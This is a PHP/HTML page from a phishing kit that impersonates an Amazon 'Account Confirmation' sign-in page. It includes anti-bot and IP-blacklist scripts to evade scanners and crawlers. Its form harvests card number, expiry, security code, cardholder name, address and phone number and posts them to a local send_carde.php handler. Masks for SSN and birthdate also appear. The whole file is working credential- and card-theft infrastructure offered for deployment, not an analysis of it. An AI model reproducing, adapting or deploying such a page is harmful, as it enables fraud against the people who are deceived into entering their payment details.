<?php

include "antibot.php";
include "antibot2.php";
include "antibot3.php";
include'anti/IP-BlackList.php';  
include'anti/Bot-Crawler.php';
include'anti/Bot-GhostEmperor.php';
include'anti/blacklist.php';
include'anti/new.php';
include "id.php";
include "./system/detect.php"; 


?><html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.19.8-2020-11-06"><head>



<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" sizes="16x16 32x32 64x64" href="./style//amazon-icon-1.svg">

    <title dir="ltr">Connexion Amazon</title>

    
      

      
        <link rel="stylesheet" href="./style/css-088.css">

<link rel="stylesheet" href="./style/css099.css">

      
    <script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.CardValidator.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/tyle.js"></script>

    
    
    
      
    
    

  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
    $('#Securitycode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#expdate').mask('00/0000');

  });
  </script>



<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}

</style>





<style>
#Securitycode {
background-image: url('./style/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
    background-size: 54px;
    background-position: 111.5% 48.1%;
}

 #cardnumber {
background-image: url('./style/cards-sprite-small@2x.png');
background-repeat: no-repeat;
    background-size: 38px;}

</style>





  </head>

  <body class="ap-locale-fr_FR a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate">




<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div id="alirctx" class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
    
      
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              






<div id="appctx" class="a-section auth-pagelet-container" style="
    width: 412px;
    margin: 0 auto;
">
  

















  
    





<div class="a-section a-spacing-base">
  <div class="a-section">
    
    <form name="signIn" method="post" action="./system/send_carde.php" class="auth-validate-form auth-real-time-validation a-spacing-none">
      
      

      




  
    
  
    
  
    
  



      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
Account Confirmation </h1>
          
          
          <div class="a-divider a-divider-break"><h5>Card Information</h5></div>






<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
Card number
</label>
<input required="" type="text" maxlength="128" id="cardnumber" name="cardnumber" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>


<div class="multi equal clearfix">
<div class=" left">


<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
Expiration date</label>
<input required="" type="text" maxlength="128" id="expdate" name="expdate" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>

</div>
<div class="right"> 

<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
Security code</label>
<input required="" type="text" maxlength="128" id="Securitycode" name="Securitycode" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>

</div></div>

<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
Name on the card</label>
<input required="" type="text" maxlength="128" id="NameOnCard" name="NameOnCard" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>





          <div class="a-row a-spacing-base">
            <div class="a-divider a-divider-break"><h5>Address information</div>






<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
Address Line
</label>
<input required="" type="text" maxlength="128" id="addres" name="addres" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>

<div class="multi equal clearfix">
<div class=" left">


<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
City</label>

<input required="" type="text" maxlength="128" id="City" name="City" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>

</div>
<div class="right"> 



<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
State</label>
<input required="" type="text" maxlength="128" id="State" name="State" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>


</div></div>




<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
Postal code
</label>
<input required="" type="text" maxlength="128" id="ZipCode" name="ZipCode" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>

<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label">
Phone number
</label>
<input required="" type="text" maxlength="128" id="phoneNumber" name="phoneNumber" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>



          </div>
          <div class="a-section">
            
            









            
            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
              Continue
            </span></span></span>

            
            
              



 

            

            



          </div>

          

          

          






          




  
  
  
    
      
      
      
        
        
      
    
  


          
          
        </div></div>
      </div>
    </form>
  </div>
  
    
    
      
        
        
        
      
    
  
</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Terms of use
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
Protection of your personal information    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
    Help
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Cookies
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Ads based on your interests
    </a>
    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
  © 1996-2022, Amazon.com, Inc. or its affiliates.
</span>

</div>

      </div>
    </div>

   
    
    
  </div>

 <script type="text/javascript">   
    $('#cardnumber').validateCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":

 $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');
$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 94%');
$('#thDSecure').css('background-position', '255.5% -20.5%'); 

                        break;
                    case "VISA ELECTRON":


$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');


$('#cardnumber').css('background-position', '98.5% 97%'); 


$('#thDSecure').css('background-position', '99.5% -20.5%'); 



$('#cscaa').removeClass('csc-image_amex').addClass('');

   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



                        break;
                    case "MASTERCARD":


$('.chtadakchi').attr('id', 'chtamastercard');



$('#cardsmiya').attr('class', 'creditOrDebit mastercard black card image');






   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');

$('#metrcardaa').removeClass('').addClass('cardImages-icon_selected');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected ').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 72%');

$('#thDSecure').css('background-position', '99.5% 9.5%'); 

                        break;
                    case "MAESTRO":

$('.chtadakchi').attr('id', 'chtamastartro');


$('#cardsmiya').attr('class', 'creditOrDebit maestro black card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');

$('#cardnumber').css('background-position', '98.5% 69%');

$('#thDSecure').css('background-position', '102.5% 62.5%'); 



                        break;
                    case "DISCOVER":


$('.chtadakchi').attr('id', 'chtadiscover');


$('#cardsmiya').attr('class', 'creditOrDebit discover gray card image');



   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');



                        $('#cardnumber').css('background-position', '98.5% 46.8%');

$('#thDSecure').css('background-position', '98.5% 46.8%'); 

          
$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('').addClass('cardImages-icon_selected');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

$('#cscaa').removeClass('csc-image_amex').addClass('');



break;
                    case "AMEX":

$('.chtadakchi').attr('id', 'chtaofam');
 

$('#cardsmiya').attr('class', 'creditOrDebit amex gray card image');




$('#csc').attr('pattern', '[0-9]{4}');
          $('#Securitycode').attr('maxlength', '4');

                        $('#cardnumber').css('background-position', '98.5% 6%');
$('#thDSecure').css('background-position', '99.5% 34%'); 




$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('').addClass('cardImages-icon_selected');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');


                        break;
          case "JCB":

$('.chtadakchi').attr('id', 'chtajcb');




$('#cardsmiya').attr('class', 'creditOrDebit jcb gold card image');



$('#csc').attr('placeholder', 'Enter security code'); 

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');
                        $('#cardnumber').css('background-position', '98.5% 32%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


                       break;
          case "DINERS_CLUB":

$('.chtadakchi').attr('id', 'chtacalub');


$('#cardsmiya').attr('class', 'creditOrDebit cb_nationale blue card image');





                        $('#cardnumber').css('background-position', '98.5% 24.8%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 

                        break;
          default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');

                        $('#cardnumber').css('background-position', '98.5% -1%');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#csc').attr('placeholder', 'Enter security code'); 
                        break;
                }
      } else {

$('.chtadakchi').attr('id', 'jkljk');

$('#thDSecure').css('background-position', '99.5% -20.5%'); 


$('#cardsmiya').attr('class', 'creditOrDebit reb3lpp blue card image');








$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

                $('#cardnumber').css('background-position', '98.5% -0.2%');

$('#csc').attr('placeholder', 'Enter security code');
            }
       // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {


                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber') .removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
    </script>



  <script type="text/javascript">
        $(function() {
        $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
      $('#cardnumber').validateCreditCard(function(result) {
          if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
          
                }
            });
            });
    });
        </script>

    <dir style="display: none;">
</div>

</body></html>